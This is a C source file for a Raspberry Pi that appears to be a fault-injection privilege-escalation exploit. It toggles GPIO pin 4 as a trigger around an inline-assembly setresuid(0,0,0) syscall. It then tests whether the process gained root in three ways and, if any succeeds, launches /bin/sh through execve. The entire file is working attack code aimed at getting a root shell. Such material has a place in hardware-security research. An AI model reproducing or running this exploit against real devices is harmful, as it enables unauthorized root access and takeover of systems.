/*
  gpiomem trigger code running as user.
*/

#define BCM2708_PERI_BASE        0x3f000000
#define GPIO_BASE                (BCM2708_PERI_BASE + 0x200000) /* GPIO controller */


#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_SIZE (4*1024)
#define BLOCK_SIZE (4*1024)

char *newargv[] = {NULL,"/bin/sh",NULL};

int  mem_fd;
void *gpio_map;

// I/O access
volatile unsigned *gpio;


// GPIO setup macros. Always use INP_GPIO(x) before using OUT_GPIO(x) or SET_GPIO_ALT(x,y)
#define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
#define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
#define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))

#define GPIO_SET *(gpio+7)  // sets   bits which are 1 ignores bits which are 0
#define GPIO_CLR *(gpio+10) // clears bits which are 1 ignores bits which are 0

#define GET_GPIO(g) (*(gpio+13)&(1<<g)) // 0 if LOW, (1<<g) if HIGH

#define GPIO_PULL *(gpio+37) // Pull up/pull down
#define GPIO_PULLCLK0 *(gpio+38) // Pull up/pull down clock

void setup_io();

void printButton(int g)
{
  if (GET_GPIO(g)) // !=0 <-> bit is 1 <- port is HIGH=3.3V
    printf("Button pressed!\n");
  else // port is LOW=0V
    printf("Button released!\n");
}

int main(int argc, char **argv)
{
  int g,rep;

  // Set up gpi pointer for direct register access
  setup_io();

  INP_GPIO(4); // must use INP_GPIO before we can use OUT_GPIO
  OUT_GPIO(4);
GPIO_CLR = 1 << 4;

  int ret = 0;
  int x, y, z = 0;
  // int out = 0;  

  GPIO_SET = 1 << 4;
  asm volatile (
  "mov r10, #0x0;" // Repeat for other
  "mov r10, #0x0;" // unused registers
  "mov r9, #0x0;" // Repeat for other
  "mov r9, #0x0;" // unused registers
  "mov r8, #0x0;" // Repeat for other
  "mov r8, #0x0;" // unused registers
  "mov r7, #0x0;" // Repeat for other
  "mov r7, #0x0;" // unused registers
  "mov r6, #0x0;" // Repeat for other
  "mov r6, #0x0;" // unused registers
  "mov r5, #0x0;" // Repeat for other
  "mov r5, #0x0;" // unused registers
  "mov r4, #0x0;" // Repeat for other
  "mov r4, #0x0;" // unused registers
  "mov r3, #0x0;" // Repeat for other
  "mov r3, #0x0;" // unused registers
  "mov r2, #0x0;" // Repeat for other
  "mov r2, #0x0;" // unused registers
  "mov r1, #0x0;" // Repeat for other
  "mov r1, #0x0;" // unused registers
  "mov r0, #0x0;" // Repeat for other
  "mov r0, #0x0;" // unused registers
  "mov r7, #0xd0;" // setresuid syscall
  "swi #0;" // Linux kernel takes over
  "mov %[ret], r0;" // Store return value in r0
  : [ret] "=r" (ret) :: "r0", "r1","r2","r3","r4","r5","r6","r7","r8","r9","r10" );
  GPIO_CLR = 1 << 4;
  for(x = 0;x < 2500;x++) 
  {
    for(y = 0;y < 2500;y++)
    {
      z++;
    }
  }
  uid_t id0,id1,id2;

  printf("%d\n",z);
  if(ret == 0)
  {
    printf("winner winner chicken dinner (return)");
    getresuid(&id0,&id1,&id2);
    printf("gri:%d/%d/%d",id0,id1,id2);
    fflush(stdout);
    setuid(0);
    execve("/bin/sh",newargv,0);
    // system("/bin/sh");
  }


  getresuid(&id0,&id1,&id2);
  if(id0 == 0 || id1 == 0 || id2 == 0)
  {
    printf("winner winner chicken dinner (getresuid)");
    fflush(stdout);
    // setuid(0);
    execve("/bin/sh",newargv,0);
    // execve("/bin/sh",0,0);
  }

  printf("gri:%d/%d/%d",id0,id1,id2);

  if(geteuid() == 0)
  {
    printf("winner winner chicken dinner (geteuid)");
    fflush(stdout);
    // setuid(0);
    execve("/bin/sh",newargv,0);
  }

  return 0;

} // main


//
// Set up a memory regions to access GPIO
//
void setup_io()
{
   /* open /dev/mem */
   if ((mem_fd = open("/dev/gpiomem", O_RDWR|O_SYNC) ) < 0) {
      printf("can't open /dev/mem \n");
      exit(-1);
   }

   /* mmap GPIO */
   gpio_map = mmap(
      NULL,             //Any adddress in our space will do
      BLOCK_SIZE,       //Map length
      PROT_READ|PROT_WRITE,// Enable reading & writting to mapped memory
      MAP_SHARED,       //Shared with other processes
      mem_fd,           //File to map
      GPIO_BASE         //Offset to GPIO peripheral
   );

   close(mem_fd); //No need to keep mem_fd open after mmap

   if (gpio_map == MAP_FAILED) {
      printf("mmap error %d\n", (int)gpio_map);//errno also set!
      exit(-1);
   }

   // Always use volatile pointer!
   gpio = (volatile unsigned *)gpio_map;


} // setup_io
